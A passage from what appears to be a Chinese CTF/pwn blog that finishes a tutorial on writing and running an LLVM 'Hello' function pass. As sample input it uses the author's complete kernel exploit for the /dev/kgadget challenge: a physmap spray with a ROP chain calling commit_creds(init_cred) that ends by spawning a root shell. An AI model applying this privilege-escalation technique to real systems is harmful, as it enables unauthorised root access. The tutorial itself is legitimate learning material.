</span>&#123;<span class="comment">//重写runOnFunction，使得每次遍历到一个函数的时候就输出函数名</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span class="comment">//注册类Hello，第一个参数是命令行参数，第二个参数是名字</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>上面就是LLVM pass的C++代码了。我们需要一个C语言文件，这个文件中的内容无关紧要，这里用笔者做kernel pwn题中的一个文件为例：</p>
<p>firstLLVMtest.c:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-7.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82A6B700</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00FB0</span> + <span class="number">0x1B</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF810001FC</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"><span class="type">size_t</span>* map_spray[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">int</span> dev;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); index++)</span><br><span class="line">        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spray content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)space, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    dev = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev &lt; <span class="number">0</span>)     <span class="comment">// failed to open key device, an unexpected error</span></span><br><span class="line">        error_log(<span class="string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);      <span class="comment">// the size of a page, namely 4096 bytes</span></span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spraying physmap......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    makeROP(map_spray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15000</span>; i++)&#123;</span><br><span class="line">        map_spray[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">            error_log(<span class="string">&quot;Mmap Failure!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(map_spray[i], map_spray[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Ready to turn to kernel......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">&quot;mov r15, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x87654321;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, poprsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, dev;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用下面的命令可以生成.ll文件准备输入到LLVM中：<code>clang -emit-llvm -S firstLLVMtest.c -o firstLLVMtest.ll</code></p>
<p>生成的.ll文件的前面一部分内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;firstLLVMtest.c&#x27;</span><br><span class="line">source_filename = &quot;firstLLVMtest.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@commit_creds = dso_local constant i64 -2129882400, align 8</span><br><span class="line">@init_cred = dso_local constant i64 -2103003392, align 8</span><br><span class="line">@swapgs_restore_regs_and_return_to_usermode = dso_local constant i64 -2118119477, align 8</span><br><span class="line">@ret = dso_local constant i64 -2130705924, align 8</span><br><span class="line">@poprdi_ret = dso_local constant i64 -2130131216, align 8</span><br><span class="line">@poprsp_ret = dso_local constant i64 -2129361968, align 8</span><br><span class="line">@add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = dso_local constant i64 -2130233346, align 8</span><br><span class="line">@.str = private unnamed_addr constant [23 x i8] c&quot;Status has been saved.\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;%#5x\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [4 x i8] c&quot;   \00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [6 x i8] c&quot;%02x \00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [4 x i8] c&quot;%s\0A\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [34 x i8] c&quot;\1B[31m\1B[1m[x] Fatal Error: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [27 x i8] c&quot;\1B[33m\1B[1m[*] Info: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [30 x i8] c&quot;\1B[32m\1B[1m[+] Success: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.8 = private unnamed_addr constant [24 x i8] c&quot;Ready to get root......\00&quot;, align 1</span><br><span class="line">@.str.9 = private unnamed_addr constant [20 x i8] c&quot;Failed to get root!\00&quot;, align 1</span><br><span class="line">@.str.10 = private unnamed_addr constant [10 x i8] c&quot;Root got!\00&quot;, align 1</span><br><span class="line">@.str.11 = private unnamed_addr constant [8 x i8] c&quot;/bin/sh\00&quot;, align 1</span><br><span class="line">@page_size = common dso_local global i64 0, align 8</span><br><span class="line">@user_cs = common dso_local global i64 0, align 8</span><br><span class="line">@user_rflags = common dso_local global i64 0, align 8</span><br><span class="line">@user_sp = common dso_local global i64 0, align 8</span><br><span class="line">@user_ss = common dso_local global i64 0, align 8</span><br><span class="line">@.str.12 = private unnamed_addr constant [21 x i8] c&quot;Spray content below:\00&quot;, align 1</span><br><span class="line">@.str.13 = private unnamed_addr constant [13 x i8] c&quot;/dev/kgadget\00&quot;, align 1</span><br><span class="line">@dev = common dso_local global i32 0, align 4</span><br><span class="line">@.str.14 = private unnamed_addr constant [35 x i8] c&quot;Cannot open device \22/dev/kgadget\22!\00&quot;, align 1</span><br><span class="line">@.str.15 = private unnamed_addr constant [23 x i8] c&quot;Spraying physmap......\00&quot;, align 1</span><br><span class="line">@map_spray = common dso_local global [16000 x i64*] zeroinitializer, align 16</span><br><span class="line">@.str.16 = private unnamed_addr constant [14 x i8] c&quot;Mmap Failure!\00&quot;, align 1</span><br><span class="line">@guess = common dso_local global i64 0, align 8</span><br><span class="line">@.str.17 = private unnamed_addr constant [30 x i8] c&quot;Ready to turn to kernel......\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save_status() #0 &#123;</span><br><span class="line">  call void asm sideeffect &quot;mov user_cs, cs;mov user_ss, ss;mov user_sp, rsp;pushf;pop user_rflags;&quot;, &quot;~&#123;dirflag&#125;,~&#123;fpsr&#125;,~&#123;flags&#125;&quot;() #6, !srcloc !2</span><br><span class="line">  call void @info_log(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @info_log(i8* %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** %2, align 8</span><br><span class="line">  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i8* %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码是可读的，用另外一种方式阐述了代码的执行流程。</p>
<p>然后使用下面的命令生成.so文件，<a target="_blank" rel="noopener" href="http://xn--LLVMLLVMFirst-ho1u05k87q6l3chnf7ltr62gj0zg.so">作为LLVM的动态链接库LLVMFirst.so</a>：<br />
<code>clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags</code></p>
<p>最后用下面的命令将.ll文件输入到LLVM中，如果想要得到结果可以在后面添加<code>&gt; [文件名]</code>来获取：<br />
<code>opt -load ./LLVMFirst.so -hello ./firstLLVMtest.ll</code></p>
<p>其执行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: save_status</span><br><span class="line">Hello: info_log</span><br><span class="line">Hello: print_binary</span><br><span class="line">Hello: error_log</span><br><span class="line">Hello: success_log</span><br><span class="line">Hello: getShell</span><br><span class="line">Hello: makeROP</span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure>
<p>可以看到输出了很多Hello开头的行，这是因为在上面的C++程序中，我们在匿名命名空间中重载了runOnFunction函数，让LLVM输出Hello之后再输出函数的名字，这样就有了上面的几行。</p>
<p>在LLVM pass中可以对函数、函数中的循环、函数中的操作指令等一系列对象进行记录、修改等各种操作，具体的操作类参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/mamamama811/article/details/110165333?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165736882716782246435214%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165736882716782246435214&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110165333-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=llvm%20pass&amp;spm=1018.2226.3001.4187">资料</a>。在下一篇文章中笔者会详细分析一道题，过一下LLVM pass类pwn题的流程。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/pwnhome-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%BF%AB%E9%80%9F%E7%B4%A2%E5%BC%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/pwnhome-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%BF%AB%E9%80%9F%E7%B4%A2%E5%BC%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" class="post-title-link" itemprop="url">pwnhome 个人博客快速索引（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:39" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:39+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>笔者学习pwn已经有一段时间了，有的时候想回顾一些知识点，翻看以前的文章却发现很难查找。这里编写一个快速索引，帮助自己以及各位读者快速找到自己需要了解的知识点。</p>
<p>笔者的github仓库内含多个方向的pwn题，在文章中分析过的题目会及时更新到这个仓库中：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">pwnfile</a></p>
<p>更新：由于做的题越来越多，github仓库不堪重负，为精简仓库，现将题目附件另外保存到网盘上，使读者能够选择性下载想要研究的题目而不是非要更新整个仓库。原github仓库只保存解题exp，如有不便敬请谅解。</p>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12_wpe0icND_Z5VXlLloKNg">https://pan.baidu.com/s/12_wpe0icND_Z5VXlLloKNg</a><br>提取码：ipwn</p>
